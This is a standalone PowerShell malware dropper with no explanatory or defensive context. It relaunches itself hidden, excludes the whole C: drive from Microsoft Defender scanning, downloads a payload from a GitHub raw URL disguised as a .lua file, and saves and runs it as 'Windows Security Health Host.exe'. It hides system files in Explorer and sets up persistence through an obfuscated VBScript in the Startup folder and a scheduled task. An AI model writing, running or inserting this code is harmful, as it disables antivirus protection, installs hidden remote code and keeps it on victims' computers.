if ($args -notcontains "-Hidden") {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Hidden" -WindowStyle Hidden
    exit
}
Add-MpPreference -ExclusionPath "C:\"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Astra-OP/example_gameclientproject/refs/heads/main/gameclient.lua' `
    -OutFile "C:\ProgramData\Windows Security Health Host.exe"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
    -Name "Hidden" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
    -Name "ShowSuperHidden" -Value 0
attrib +s +h "C:\ProgramData\Windows Security Health Host.exe"
Start-Process "C:\ProgramData\Windows Security Health Host.exe"
$psScriptContent = @'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
'@
Set-Content -Path "C:\ProgramData\DisableShowSuperHidden.ps1" -Value $psScriptContent
$vbsScriptContent = @'
Execute chr(585648/CLng(&H1B90))&chr(585396/CLng(&H16A4))&chr(350320/CLng(&HBCC))&chr(4512/CLng(&H8D))&chr(904206/CLng(&H1FD2))&chr(44590/CLng(&H1C7))&chr(914462/CLng(&H21B3))&chr(310088/CLng(&HE98))&chr(-8611+CLng(&H220B))&chr(959197/CLng(&H2519))&chr(567000/CLng(&H1482))&chr(57888/CLng(&H218))&chr(150016/CLng(&H1250))&chr(379908/CLng(&H1854))&chr(84448/CLng(&HA4F))&chr(556033/CLng(&H206B))&chr(671802/CLng(&H1705))&chr(-9010+CLng(&H2397))&chr(674344/CLng(&H1B28))&chr(283040/CLng(&H988))&chr(107565/CLng(&H429))&chr(-6684+CLng(&H1A6B))&chr(-5655+CLng(&H1679))&chr(109286/CLng(&H407))&chr(-2745+CLng(&HB1E))&chr(292941/CLng(&HB8F))&chr(349276/CLng(&HBC3))&chr(391960/CLng(&H2647))&chr(-2750+CLng(&HAE0))&chr(141723/CLng(&H65D))&chr(471730/CLng(&H1006))&chr(705672/CLng(&H1BD8))&chr(-6219+CLng(&H18BD))&chr(195405/CLng(&H745))&chr(90496/CLng(&H328))&chr(1050728/CLng(&H2362))&chr(361238/CLng(&H1EAD))&chr(240534/CLng(&HB52))&chr(657072/CLng(&H18AE))&chr(-4185+CLng(&H10BE))&chr(605988/CLng(&H15EB))&chr(986904/CLng(&H23B2))&chr(7718/CLng(&HE3))&chr(375683/CLng(&H23CB))&chr(88140/CLng(&H1A7C))&chr(51380/CLng(&H1412))&chr(392496/CLng(&HDD0))&chr(-2600+CLng(&HA8A))&chr(258534/CLng(&H987))&chr(50630/CLng(&H262))&chr(379704/CLng(&HE43))&chr(157358/CLng(&H616))&chr(277992/CLng(&HA0E))&chr(-5314+CLng(&H152E))&chr(431756/CLng(&H24AA))&chr(415084/CLng(&H13C6))&chr(125775/CLng(&H433))&chr(505670/CLng(&H11F5))&chr(190784/CLng(&H174A))&chr(-155+CLng(&HBD))&chr(-707+CLng(&H2E5))&chr(-3284+CLng(&HCF6))&chr(201/CLng(&H3))&chr(381176/CLng(&H19AC))&chr(-8183+CLng(&H2053))&chr(153600/CLng(&H780))&chr(517902/CLng(&H11BF))&chr(166611/CLng(&H5DD))&chr(956767/CLng(&H2449))&chr(102258/CLng(&H381))&chr(389843/CLng(&HFB3))&chr(-4814+CLng(&H133B))&chr(-3230+CLng(&HCE2))&chr(-5802+CLng(&H170B))&chr(-9161+CLng(&H243D))&chr(430680/CLng(&H1158))&chr(802792/CLng(&H2216))&chr(237510/CLng(&HAAA))&chr(-2462+CLng(&HA07))&chr(34210/CLng(&H137))&chr(790200/CLng(&H1EDE))&chr(261294/CLng(&H932))&chr(303093/CLng(&H9F3))&chr(51750/CLng(&H1C2))&chr(65952/CLng(&H80D))&chr(488621/CLng(&H16FF))&chr(937280/CLng(&H2440))&chr(-5331+CLng(&H1536))&chr(742365/CLng(&H18C9))&chr(-9491+CLng(&H2585))&chr(969675/CLng(&H2413))&chr(-3362+CLng(&HD96))&chr(-4680+CLng(&H12C1))&chr(-9906+CLng(&H26D2))&chr(20880/CLng(&H122))&chr(553278/CLng(&H1566))&chr(522151/CLng(&H1507))&chr(915084/CLng(&H2119))&chr(780100/CLng(&H1A45))&chr(1036776/CLng(&H26F1))&chr(158496/CLng(&H1359))&chr(-6882+CLng(&H1B2A))&chr(469530/CLng(&H1086))&chr(937020/CLng(&H1FD4))&chr(496016/CLng(&H10B4))&chr(104834/CLng(&H8E7))&chr(494799/CLng(&H1323))&chr(1064040/CLng(&H22A3))&chr(305626/CLng(&HBD2))&chr(51136/CLng(&H5E0))&chr(75956/CLng(&H8BA))&chr(123624/CLng(&HE34))&chr(-4737+CLng(&H12AD))&chr(218944/CLng(&H1ABA))&chr(294720/CLng(&H17FC))&chr(71192/CLng(&H652))&chr(64864/CLng(&H7EB))&chr(-576+CLng(&H294))&chr(904362/CLng(&H1EFD))&chr(-4520+CLng(&H121D))&chr(-1055+CLng(&H484))&chr(6266/CLng(&H1E2))&chr(53310/CLng(&H14D3))&chr(240648/CLng(&H878))&chr(731570/CLng(&H1D29))&chr(422940/CLng(&HF96))&chr(-7378+CLng(&H1D25))&chr(660088/CLng(&H18CB))&chr(15958/CLng(&H9E))&chr(434268/CLng(&HFB5))&chr(1064340/CLng(&H267F))&chr(320252/CLng(&H1B32))&chr(602372/CLng(&H1CB2))&chr(417339/CLng(&HDEF))&chr(-9341+CLng(&H24EB))&chr(206752/CLng(&H193D))&chr(-1011+CLng(&H415))&chr(87136/CLng(&H30A))&chr(1064934/CLng(&H257A))&chr(588455/CLng(&H1351))&chr(220079/CLng(&H883))&chr(451326/CLng(&HF77))&chr(-4920+CLng(&H13AB))&chr(538096/CLng(&H1436))&chr(563176/CLng(&H15C8))&chr(709992/CLng(&H19AE))&chr(-6823+CLng(&H1B13))&chr(347852/CLng(&H1D8A))&chr(-4871+CLng(&H136C))&chr(268560/CLng(&H8BE))&chr(-7745+CLng(&H1EA6))&chr(165792/CLng(&H143D))&chr(360360/CLng(&H1F48))&chr(758784/CLng(&H2600))&chr(749139/CLng(&H1A5D))&chr(700720/CLng(&H2237))&chr(140448/CLng(&H4D0))&chr(885114/CLng(&H1F26))&chr(-3915+CLng(&HFB1))&chr(-1574+CLng(&H68F))&chr(550584/CLng(&H13EA))&chr(107262/CLng(&H426))&chr(205792/CLng(&H191F))&chr(-4936+CLng(&H1375))&chr(618723/CLng(&H2307))&chr(388440/CLng(&HCA5))&chr(220281/CLng(&H885))&chr(233739/CLng(&H939))&chr(714285/CLng(&H17D9))&chr(451936/CLng(&HF38))&chr(615300/CLng(&H16E4))&chr(574203/CLng(&H1435))&chr(955460/CLng(&H21EE))&chr(-2516+CLng(&HA24))&chr(-3360+CLng(&HD8F))&chr(801792/CLng(&H1D00))&chr(292635/CLng(&HAE3))&chr(400950/CLng(&HFD2))&chr(897699/CLng(&H1CFB))&chr(24992/CLng(&H30D))&chr(224070/CLng(&HD43))&chr(378004/CLng(&HC34))&chr(170128/CLng(&H5EF))&chr(-9466+CLng(&H255B))&chr(-9286+CLng(&H24B9))&chr(1132060/CLng(&H2674))&chr(191680/CLng(&H1766))&chr(-5705+CLng(&H1676))&chr(-8533+CLng(&H219B))&chr(460845/CLng(&H1125))&chr(265464/CLng(&H99A))&chr(401273/CLng(&HF85))&chr(86560/CLng(&HA91))&chr(-2064+CLng(&H832))&chr(-8921+CLng(&H22FB))&chr(437175/CLng(&H197D))&chr(134386/CLng(&H90D))&chr(778596/CLng(&H210F))&chr(393680/CLng(&H1339))&chr(951900/CLng(&H209E))&chr(217116/CLng(&H7A4))&chr(-4030+CLng(&H1025))&chr(-6085+CLng(&H1837))&chr(198947/CLng(&H803))&chr(-4937+CLng(&H13B6))&chr(674220/CLng(&H26BB))&chr(3977/CLng(&H29))&chr(335008/CLng(&HB48))&chr(864658/CLng(&H22D2))&chr(-1678+CLng(&H6EA))&chr(-36+CLng(&H68))&chr(-3670+CLng(&HEBF))&chr(1126540/CLng(&H2644))&chr(564152/CLng(&H16B8))&chr(142198/CLng(&H5AB))&chr(30564/CLng(&H11B))&chr(791335/CLng(&H1E9B))&chr(276224/CLng(&HD00))&chr(577408/CLng(&H15B0))&chr(-5530+CLng(&H1609))&chr(247163/CLng(&H81D))&chr(476088/CLng(&H1668))&chr(618111/CLng(&H14A3))&chr(-5619+CLng(&H1663))&chr(-5376+CLng(&H1565))&chr(1097592/CLng(&H259C))&chr(714744/CLng(&H26C7))&chr(429870/CLng(&HFFE))&chr(989500/CLng(&H26A7))&chr(174600/CLng(&H6D2))&chr(17271/CLng(&HAB))&chr(-6816+CLng(&H1B0E))&chr(50508/CLng(&H44A))&chr(446880/CLng(&HF96))&chr(357765/CLng(&HC27))&chr(395920/CLng(&H1F90))&chr(127806/CLng(&HEAF))&chr(286110/CLng(&H20DF))&chr(246398/CLng(&H1C4F))&chr(178860/CLng(&HFE1))&chr(206624/CLng(&H1939))&chr(107232/CLng(&H8BA))&chr(329384/CLng(&H1D3E))&chr(289440/CLng(&H2355))&chr(560784/CLng(&H1A14))&chr(320910/CLng(&HAFF))&chr(16731/CLng(&H8F))&chr(993941/CLng(&H2671))&chr(75530/CLng(&H16B2))&chr(26810/CLng(&HA79))&chr(658771/CLng(&H1F01))&chr(94233/CLng(&H3A5))&chr(-4039+CLng(&H103B))&chr(144480/CLng(&H11A3))&chr(554334/CLng(&H1382))&chr(926296/CLng(&H24EC))&chr(626990/CLng(&H171B))&chr(-6069+CLng(&H1808))&chr(191880/CLng(&H735))&chr(-88+CLng(&HBD))&chr(453816/CLng(&H106A))&chr(603180/CLng(&H15D1))&chr(13760/CLng(&H1AE))&chr(36051/CLng(&H24F))&chr(192992/CLng(&H178F))&chr(465270/CLng(&H174D))&chr(1009434/CLng(&H2386))&chr(668160/CLng(&H1680))&chr(-7222+CLng(&H1C9E))&chr(-492+CLng(&H255))&chr(834570/CLng(&H1DA3))&chr(355762/CLng(&HD7E))&vbCrlf
'@
Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs" `
    -Value $vbsScriptContent
$vbsScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs"
$taskName = "DisableShowSuperHidden"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $vbsScriptPath
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Disable ShowSuperHidden at startup"

attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs"
attrib +s +h "C:\ProgramData\DisableShowSuperHidden.ps1"
